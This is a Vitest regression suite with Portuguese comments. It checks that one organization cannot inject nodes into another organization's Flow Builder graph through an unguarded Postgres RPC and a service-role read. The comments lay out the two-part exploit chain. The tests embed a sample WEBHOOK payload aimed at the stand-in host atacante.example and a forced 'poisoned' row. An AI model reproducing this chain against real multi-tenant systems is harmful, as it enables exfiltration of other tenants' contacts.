import { execFileSync } from "node:child_process";
import { beforeAll, describe, expect, it } from "vitest";

/**
 * O FLOW DE UMA ORGANIZAÇÃO NÃO PODE SER ESCRITO NEM LIDO POR OUTRA.
 *
 * ═══ A falha que este arquivo prende ═══
 *
 * Encontrada na auditoria da branch `feature/flow-builder`, antes do commit.
 * Era uma CADEIA de duas metades, e cada metade sozinha parecia inofensiva:
 *
 *   ESCRITA · `fn_flow_replace_graph` (migration 0311) recebia `p_flow_id` e
 *     `p_organization_id` sem conferir que o primeiro pertence ao segundo. A
 *     RLS de `flow_nodes`/`flow_edges` não cobre esse buraco: o `with check`
 *     valida a COLUNA `organization_id` da linha escrita, nunca o dono do
 *     `flow_id` que ela referencia. E a função é `grant execute ... to
 *     authenticated`, ou seja, chamável direto no PostgREST
 *     (`POST /rest/v1/rpc/fn_flow_replace_graph`) por qualquer manager de
 *     qualquer organização — sem passar pela rota Next.js que confere a posse.
 *
 *   LEITURA · `loadFlowGraph` (lib/flows/graph.ts) carregava o grafo com o
 *     client ADMIN (service role, que BYPASSA RLS) filtrando só por `flow_id`.
 *     É o anti-pattern nº 10 do CLAUDE.md, e era o que fazia a escrita acima
 *     virar execução: os nós injetados entravam no grafo da vítima na hora em
 *     que o flow DELA disparava.
 *
 * Juntas: um nó WEBHOOK injetado exfiltra o contato alheio; um nó MESSAGE manda
 * WhatsApp pelo número da vítima.
 *
 * ═══ Por que o teste de RLS ao lado NÃO bastava ═══
 *
 * `rls-isolation.test.ts` mede o que o papel `authenticated` ENXERGA — e ali as
 * cinco tabelas do flow passam, porque a policy de SELECT está correta. A falha
 * vivia fora do alcance dele: na ESCRITA que a RLS aprova por olhar a coluna
 * errada, e na LEITURA que acontece com service role, onde RLS não se aplica
 * por definição. Por isso este arquivo mede a cadeia inteira, nas duas pontas,
 * e simula o service role explicitamente (`set role service_role`).
 *
 * ═══ O que cada caso prova ═══
 *
 *   1. a RPC recusa o par (flow de A, organização de B);
 *   2. a recusa é ATÔMICA — o grafo de A fica byte a byte como estava;
 *   3. a RPC aceita o caminho legítimo (controle positivo: sem ele, uma função
 *      quebrada que recusasse TUDO passaria nos dois casos acima);
 *   4. mesmo com uma linha envenenada forçada por dentro (ignorando a RPC), a
 *      leitura do motor não a devolve — a segunda metade fecha sozinha.
 */

const container = process.env.TEST_DB_CONTAINER;
if (!container) {
  throw new Error(
    "TEST_DB_CONTAINER not set — run this suite via `pnpm test:db` (scripts/test-db.sh)",
  );
}
const containerName: string = container;

function sql(script: string): string {
  return execFileSync(
    "docker",
    ["exec", "-i", containerName, "psql", "-U", "postgres", "-d", "postgres", "-v", "ON_ERROR_STOP=1", "-tA", "-f", "-"],
    { input: script, encoding: "utf8" },
  ).trim();
}

/** Roda o script e devolve o erro do Postgres em vez de explodir. */
function sqlEsperandoErro(script: string): string {
  try {
    sql(script);
    return "";
  } catch (e) {
    const err = e as { stderr?: Buffer | string; message?: string };
    return String(err.stderr ?? err.message ?? e);
  }
}

/** Últim(a) linha não vazia — o valor que interessa depois dos ecos do psql. */
function ultima(saida: string): string {
  const linhas = saida.split("\n").filter((l) => l.trim() !== "");
  return linhas[linhas.length - 1] ?? "";
}

const ORG_A = "a0000000-0000-4000-8000-00000000f10a";
const ORG_B = "b0000000-0000-4000-8000-00000000f10b";
const MGR_A = "a1111111-0000-4000-8000-00000000f10a";
const MGR_B = "b1111111-0000-4000-8000-00000000f10b";
const FLOW_A = "aaaa0000-0000-4000-8000-00000000f10a";
const FLOW_B = "bbbb0000-0000-4000-8000-00000000f10b";
const NODE_A = "aaaa1111-0000-4000-8000-00000000f10a";

/** O nó que o atacante tenta pendurar no flow da vítima. */
const NODE_INVASOR = "cccc9999-0000-4000-8000-00000000f10c";

/**
 * Chama a RPC como o PostgREST chamaria: papel `authenticated` + claims do JWT.
 * É o caminho EXATO do ataque — sem passar pela rota Next.js, que é o que
 * torna a guarda da função (e não a da rota) a barreira que importa.
 */
function replaceGraphComo(userId: string, flowId: string, orgId: string, nodes: string): string {
  return sqlEsperandoErro(`
    set role authenticated;
    select set_config('request.jwt.claims', '{"sub":"${userId}"}', false);
    select public.fn_flow_replace_graph(
      '${flowId}'::uuid,
      '${orgId}'::uuid,
      '${nodes}'::jsonb,
      '[]'::jsonb
    );
  `);
}

/** O que o MOTOR enxerga: service role (bypassa RLS) + os dois filtros. */
function grafoComoOMotorLe(orgId: string, flowId: string): number {
  const out = sql(`
    set role service_role;
    select count(*) from public.flow_nodes
     where organization_id = '${orgId}'::uuid and flow_id = '${flowId}'::uuid;
  `);
  return Number(ultima(out));
}

/** Quantos nós existem no flow, sem recorte de organização nenhum. */
function nosDoFlowSemRecorte(flowId: string): number {
  return Number(ultima(sql(`select count(*) from public.flow_nodes where flow_id = '${flowId}'::uuid;`)));
}

beforeAll(() => {
  sql(`
    insert into auth.users (id, email) values
      ('${MGR_A}', 'flow-iso-a@invariant.test'),
      ('${MGR_B}', 'flow-iso-b@invariant.test')
      on conflict (id) do nothing;

    insert into public.organizations (id, slug, legal_name, display_name) values
      ('${ORG_A}', 'flow-iso-a', 'Flow Iso A', 'Flow Iso A'),
      ('${ORG_B}', 'flow-iso-b', 'Flow Iso B', 'Flow Iso B')
      on conflict (id) do nothing;

    -- MANAGER nas duas pontas, e não 'agent': é o papel mínimo que a RLS de
    -- escrita de flow_nodes exige. Com 'agent' o ataque seria barrado pelo
    -- motivo ERRADO (papel), e o teste passaria sem provar a guarda de posse.
    insert into public.user_organizations (user_id, organization_id, role, accepted_at) values
      ('${MGR_A}', '${ORG_A}', 'manager', now()),
      ('${MGR_B}', '${ORG_B}', 'manager', now())
      on conflict do nothing;

    insert into public.flows (id, organization_id, name, trigger_type, trigger_config) values
      ('${FLOW_A}', '${ORG_A}', 'flow da vitima', 'contact_tag_added', '{"tag":"iso"}'::jsonb),
      ('${FLOW_B}', '${ORG_B}', 'flow do atacante', 'contact_tag_added', '{"tag":"iso"}'::jsonb)
      on conflict (id) do nothing;

    -- O grafo legítimo da vítima: um nó, para a contagem "antes" ser != 0 e a
    -- prova de atomicidade ter o que comparar.
    insert into public.flow_nodes (id, organization_id, flow_id, type, label, config) values
      ('${NODE_A}', '${ORG_A}', '${FLOW_A}', 'TRIGGER', 'gatilho da vitima',
       '{"trigger_type":"contact_tag_added"}'::jsonb)
      on conflict (id) do nothing;
  `);
});

describe("isolamento cross-tenant do Flow Builder", () => {
  it("ESCRITA · manager de B NÃO consegue substituir o grafo do flow de A", () => {
    const antes = nosDoFlowSemRecorte(FLOW_A);
    expect(antes, "o flow da vítima precisa começar com o nó legítimo").toBe(1);

    const erro = replaceGraphComo(
      MGR_B,
      FLOW_A, // o flow é da VÍTIMA
      ORG_B, // a organização é a do ATACANTE — o par que a guarda recusa
      `[{"id":"${NODE_INVASOR}","type":"WEBHOOK","label":"exfiltra","config":{"url":"https://atacante.example"},"position_x":0,"position_y":0}]`,
    );

    // A guarda de `fn_flow_replace_graph`: o par (flow, organização) não existe.
    expect(erro).toContain("flow_not_found_in_organization");
  });

  it("ESCRITA · a recusa é ATÔMICA: o grafo da vítima fica intacto", () => {
    // Não basta a RPC levantar: se ela tivesse apagado antes de recusar, a
    // vítima perderia o desenho. A guarda roda ANTES do primeiro delete.
    expect(nosDoFlowSemRecorte(FLOW_A)).toBe(1);

    const nenhumInvasor = Number(
      ultima(sql(`select count(*) from public.flow_nodes where id = '${NODE_INVASOR}'::uuid;`)),
    );
    expect(nenhumInvasor, "o nó do atacante não pode existir em lugar nenhum").toBe(0);

    const soDaVitima = Number(
      ultima(
        sql(`select count(*) from public.flow_nodes
              where flow_id = '${FLOW_A}'::uuid and organization_id <> '${ORG_A}'::uuid;`),
      ),
    );
    expect(soDaVitima, "nenhuma linha de outra organização pendurada no flow da vítima").toBe(0);
  });

  it("CONTROLE POSITIVO · o dono do flow continua salvando o próprio grafo", () => {
    // Sem este caso, uma função que recusasse TUDO passaria nos dois de cima —
    // e o produto estaria quebrado com o teste verde.
    const erro = replaceGraphComo(
      MGR_B,
      FLOW_B,
      ORG_B,
      `[{"id":"bbbb1111-0000-4000-8000-00000000f10b","type":"TRIGGER","label":"meu gatilho","config":{"trigger_type":"contact_tag_added"},"position_x":0,"position_y":0}]`,
    );
    expect(erro, "o caminho legítimo não pode ser recusado").toBe("");
    expect(grafoComoOMotorLe(ORG_B, FLOW_B)).toBe(1);
  });

  it("LEITURA · o motor (service role) não carrega nó de outra organização", () => {
    // A SEGUNDA METADE, provada sozinha. Aqui a linha envenenada é forçada por
    // DENTRO, como `postgres` — ignorando a RPC de propósito, para medir só a
    // leitura. É o estado que existiria se a guarda de escrita falhasse ou se
    // uma linha chegasse por outro caminho (import, correção manual, bug
    // futuro): mesmo assim, o motor não pode enxergá-la.
    sql(`
      insert into public.flow_nodes (id, organization_id, flow_id, type, label, config)
      values ('${NODE_INVASOR}', '${ORG_B}', '${FLOW_A}', 'WEBHOOK', 'envenenado',
              '{"url":"https://atacante.example"}'::jsonb)
      on conflict (id) do nothing;
    `);

    // Sem recorte, a linha está lá — o controle que prova que a sonda enxerga.
    expect(nosDoFlowSemRecorte(FLOW_A), "a linha envenenada precisa existir para a prova valer").toBe(2);

    // Com o recorte que `loadFlowGraph` faz hoje, o motor da VÍTIMA vê só o seu.
    expect(grafoComoOMotorLe(ORG_A, FLOW_A)).toBe(1);

    const tipos = sql(`
      set role service_role;
      select coalesce(string_agg(type, ','), '') from public.flow_nodes
       where organization_id = '${ORG_A}'::uuid and flow_id = '${FLOW_A}'::uuid;
    `);
    expect(ultima(tipos), "o nó WEBHOOK do atacante não entra no grafo da vítima").toBe("TRIGGER");
  });

  it("LEITURA · a consulta ANTIGA (só por flow_id) devolveria o nó envenenado", () => {
    // O CONTRAFACTUAL. Sem ele, o caso acima poderia estar verde por acaso —
    // por exemplo se o insert do envenenamento tivesse falhado calado. Aqui se
    // mede exatamente a query que existia antes do conserto, e ela DEVE trazer
    // o nó do atacante. É isto que dá sentido ao filtro novo.
    const comoEraAntes = Number(
      ultima(
        sql(`set role service_role;
             select count(*) from public.flow_nodes where flow_id = '${FLOW_A}'::uuid;`),
      ),
    );
    expect(comoEraAntes, "a query antiga misturava as duas organizações").toBe(2);
  });
});
